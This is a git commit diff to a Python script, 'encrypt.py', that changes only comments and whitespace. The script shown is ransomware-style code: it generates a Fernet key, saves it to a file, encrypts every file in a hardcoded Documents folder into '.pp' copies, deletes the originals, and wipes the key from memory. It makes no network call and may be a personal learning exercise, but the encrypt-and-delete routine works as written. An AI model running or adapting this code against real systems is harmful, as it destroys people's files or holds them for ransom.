1041eb5780b3549216ea9035c1653eae3a656b6b
Chris-M16 <71295173+Chris-M16@users.noreply.github.com>
2023-12-10 12:50:01 -0500

    Update encrypt.py

--- encrypt.py
+++ encrypt.py
@@ -2,7 +2,7 @@ from cryptography.fernet import Fernet
 import os
 import ctypes
 
-# Generate a random symmetric key
+# Generate a symmetric key
 symmetric_key = Fernet.generate_key()
 
 # Save the symmetric key to a file
@@ -12,34 +12,35 @@ with open("smem-enc", "wb") as key_file:
 # Create a Fernet cipher with the key
 cipher = Fernet(symmetric_key)
 
-# Define the directory to encrypt
+# Specify the directory that will be encrypted
 directory_to_encrypt = "/home/chris/Documents"
 
-# Iterate through files in the directory
+# Loop to find, encrypt, and delete original version
 for filename in os.listdir(directory_to_encrypt):
     filepath = os.path.join(directory_to_encrypt, filename)
-
-    # Check if it's a file
+   
+    # Confirm it is a file
     if os.path.isfile(filepath):
-        # Read the content of the file
+        
+        # Save contents of file
         with open(filepath, "rb") as file:
             plaintext = file.read()
-
-        # Encrypt the file content
+        
+        # Encrypt the contents of the file
         ciphertext = cipher.encrypt(plaintext)
-
+        
         # Create a new filename with a new extension
         encrypted_filename = filename + ".pp"
         encrypted_filepath = os.path.join(directory_to_encrypt, encrypted_filename)
-
+       
         # Write the encrypted content to the new file
         with open(encrypted_filepath, "wb") as encrypted_file:
             encrypted_file.write(ciphertext)
-
+        
         # Delete the original file
         os.remove(filepath)
 
-# Explicitly clear the symmetric key from memory
+# Clear the symmetric key from memory (not 100% perfect)
 ctypes.memset(symmetric_key, 0, len(symmetric_key))
 
 print("Encryption completed.")
